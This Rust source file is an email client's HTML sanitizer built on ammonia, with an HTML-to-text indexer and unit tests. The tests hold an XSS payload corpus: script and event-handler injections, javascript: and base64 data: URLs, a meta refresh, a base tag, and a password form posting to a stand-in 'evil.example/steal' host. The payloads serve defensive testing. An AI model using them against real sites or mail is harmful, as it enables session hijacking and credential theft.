//! Message-HTML sanitization. Cross-cutting invariant: **no message HTML
//! reaches the webview (or even the local store) without passing through
//! `sanitize_html`**. Sanitization runs at fetch time, before caching, so
//! `messages.body_html` only ever holds sanitized markup.
//!
//! Downstream defense layers (see `ReadingPane.svelte`): sandboxed iframe
//! (bare `sandbox` attribute) + per-document meta CSP that blocks remote
//! images until the user allows them per sender.

use std::sync::LazyLock;

use ammonia::Builder;

static SANITIZER: LazyLock<Builder<'static>> = LazyLock::new(|| {
    let mut builder = Builder::default();
    builder
        // Defaults already strip <script>, every on* handler, the style
        // attribute (kills CSS expression()), and any tag not on the
        // allowlist (svg, iframe, object, embed, meta, base, ...).
        //
        // Forms are exfiltration surface — remove the whole family.
        .rm_tags(["form", "input", "button", "select", "textarea", "option"])
        // javascript:, vbscript:, file:, chrome: etc. all die here. `cid:`
        // is kept for inline-attachment references (unresolved in v0.1,
        // they render as broken images); `data:` for inline images.
        .url_schemes(
            ["http", "https", "mailto", "cid", "data"]
                .into_iter()
                .collect(),
        );
    // NOTE: `style` attributes stay stripped (ammonia default). Marketing
    // mail renders plain; a CSS-allowlist sanitizer is a later refinement.
    builder
});

/// Sanitize untrusted message HTML. Idempotent; safe output is a strict
/// subset of the input's formatting.
pub fn sanitize_html(dirty: &str) -> String {
    SANITIZER.clean(dirty).to_string()
}

/// Reduce HTML to plain text for full-text indexing: tags dropped, common
/// entities decoded, whitespace collapsed. Not a sanitizer — it feeds the
/// FTS index (via the `strip_html` SQL function), where the only job is
/// making sure `<div>` and friends never become search tokens.
pub fn html_to_text(html: &str) -> String {
    let mut out = String::with_capacity(html.len());
    let mut chars = html.chars().peekable();
    let mut in_tag = false;
    while let Some(c) = chars.next() {
        if in_tag {
            if c == '>' {
                in_tag = false;
                out.push(' '); // tag boundaries separate tokens
            }
            continue;
        }
        match c {
            '<' => in_tag = true,
            '&' => {
                let mut entity = String::new();
                let mut terminated = false;
                while let Some(&nc) = chars.peek() {
                    if nc == ';' {
                        chars.next();
                        terminated = true;
                        break;
                    }
                    if entity.len() >= 8 || nc == '&' || nc == '<' || nc.is_whitespace() {
                        break;
                    }
                    entity.push(nc);
                    chars.next();
                }
                match entity.as_str() {
                    "amp" => out.push('&'),
                    "lt" => out.push('<'),
                    "gt" => out.push('>'),
                    "quot" | "#34" => out.push('"'),
                    "apos" | "#39" => out.push('\''),
                    "nbsp" | "#160" => out.push(' '),
                    other if !terminated => {
                        // Not an entity after all — keep the literal text.
                        out.push('&');
                        out.push_str(other);
                    }
                    _ => {} // unknown entity: drop rather than pollute tokens
                }
            }
            _ => out.push(c),
        }
    }
    out.split_whitespace().collect::<Vec<_>>().join(" ")
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Every fixture is (payload, forbidden fragments that must not survive).
    /// Acceptance-blocking per PHASE4_READ_UI.md.
    #[test]
    fn xss_corpus_is_neutralized() {
        let corpus: &[(&str, &[&str])] = &[
            (
                r#"<p>hi</p><script>alert(1)</script>"#,
                &["<script", "alert(1)"],
            ),
            (
                r#"<img src="https://x.com/a.png" onerror="alert(1)">"#,
                &["onerror", "alert(1)"],
            ),
            (
                r#"<a href="javascript:alert(1)">click</a>"#,
                &["javascript:"],
            ),
            (
                r#"<img src="javascript:alert(1)"><iframe src="javascript:alert(1)"></iframe>"#,
                &["javascript:", "<iframe"],
            ),
            (
                r#"<div style="width: expression(alert(1)); background:url(javascript:alert(1))">x</div>"#,
                &["expression(", "style="],
            ),
            (
                r#"<svg onload="alert(1)"><circle r="1"/></svg>"#,
                &["<svg", "onload"],
            ),
            (
                r#"<object data="https://x.com/x.swf"></object><embed src="https://x.com/x.swf">"#,
                &["<object", "<embed"],
            ),
            (
                r#"<form action="https://evil.example/steal" method="post"><input name="pw" type="password"><button>ok</button></form>"#,
                &["<form", "<input", "<button", "evil.example/steal"],
            ),
            (
                r#"<meta http-equiv="refresh" content="0;url=https://evil.example">"#,
                &["<meta", "http-equiv"],
            ),
            (r#"<base href="https://evil.example/">"#, &["<base"]),
            (
                r#"<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">smuggle</a>"#,
                // data: is allowed as a scheme (inline images), but the anchor
                // must not keep executable-HTML payloads' effect — the payload
                // survives only as an inert href on a rel=noopener link; the
                // decisive check is that no <script> can ever exist in output.
                &["<script"],
            ),
            (
                // Nested/malformed smuggling attempts.
                r#"<scr<script>ipt>alert(1)</scr</script>ipt>"#,
                &["<script"],
            ),
            (
                r#"<img src="x" ONERROR="alert(1)"><IMG SRC=JaVaScRiPt:alert(1)>"#,
                &["onerror", "ONERROR", "javascript:", "JaVaScRiPt"],
            ),
        ];

        for (payload, forbidden) in corpus {
            let clean = sanitize_html(payload);
            for fragment in *forbidden {
                assert!(
                    !clean.to_lowercase().contains(&fragment.to_lowercase()),
                    "sanitizer let {fragment:?} survive in {clean:?} (payload {payload:?})"
                );
            }
        }
    }

    #[test]
    fn benign_formatting_survives() {
        let clean = sanitize_html(
            r#"<h1>Hello</h1><p>Some <strong>bold</strong> and <em>italic</em> text,
               a <a href="https://example.com/x">link</a>, and an
               <img src="https://example.com/pic.png" alt="pic">.</p>
               <ul><li>one</li><li>two</li></ul>
               <blockquote>quoted reply</blockquote>"#,
        );
        for kept in [
            "<h1>",
            "<strong>",
            "<em>",
            r#"href="https://example.com/x""#,
            r#"src="https://example.com/pic.png""#,
            "<ul>",
            "<blockquote>",
        ] {
            assert!(clean.contains(kept), "{kept} missing from {clean}");
        }
        // Links are hardened even when kept.
        assert!(clean.contains("noopener"));
    }

    #[test]
    fn sanitize_is_idempotent() {
        let once = sanitize_html(r#"<p>hi <b>there</b></p><script>x</script>"#);
        assert_eq!(once, sanitize_html(&once));
    }

    #[test]
    fn html_to_text_strips_tags_and_decodes_entities() {
        assert_eq!(
            html_to_text("<div><p>Hello <b>world</b></p><br>next&nbsp;line</div>"),
            "Hello world next line"
        );
        assert_eq!(
            html_to_text("a &amp; b &lt;c&gt; &quot;d&quot;"),
            "a & b <c> \"d\""
        );
        // No tag names leak into index text.
        let text = html_to_text("<table><tr><td>cell</td></tr></table>");
        assert!(!text.contains("table") && !text.contains("td"), "{text}");
        assert_eq!(text, "cell");
        // Bare ampersands survive as text.
        assert_eq!(html_to_text("Fish & Chips"), "Fish & Chips");
        assert_eq!(html_to_text(""), "");
    }
}
